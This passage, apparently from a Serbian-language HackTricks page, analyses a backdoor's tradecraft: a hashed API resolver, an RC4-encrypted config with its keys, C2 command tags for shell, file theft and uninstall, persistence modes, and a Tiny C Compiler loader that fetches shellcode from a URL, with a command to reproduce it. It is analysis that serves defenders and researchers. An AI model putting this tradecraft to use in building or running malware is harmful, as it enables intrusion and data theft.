- Koristi drugi resolver koji šeta kroz **PEB → InMemoryOrderModuleList**, parsira svaki export table u 4-byte blokovima sa Murmur-style mešanjem, i samo se vraća na `GetProcAddress` ako hash nije pronađen.

Ugrađena konfiguracija & C2
- Konfiguracija se nalazi unutar ubačenog `BluetoothService` fajla na **offset 0x30808** (veličina **0x980**) i RC4-dešifruje se sa ključem `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beaconi grade dot-delimited host profil, dodaju tag `4Q`, zatim RC4-enkriptuju sa ključem `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS-a. Odgovori se RC4-dešifruju i distribuiraju preko tag switch-a (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer slučajevi).
- Režim izvršavanja se kontroliše CLI argumentima: bez argumenata = instalira persistence (service/Run key) upućujući na `-i`; `-i` ponovo pokreće self sa `-k`; `-k` preskače instalaciju i izvršava payload.

Alternativni loader koji je primećen
- Ista intruzija je drop-ovala Tiny C Compiler i izvršila `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. Napadač-supplied C source je ugrađivao shellcode, kompajlirao ga i pokretao u memoriji bez dodirivanja diska sa PE. Reproducirajte sa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ovaj TCC-based compile-and-run stage je uvezao `Wininet.dll` u runtime-u i povukao second-stage shellcode sa hardcoded URL-a, dajući fleksibilan loader koji se predstavlja kao compiler run.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
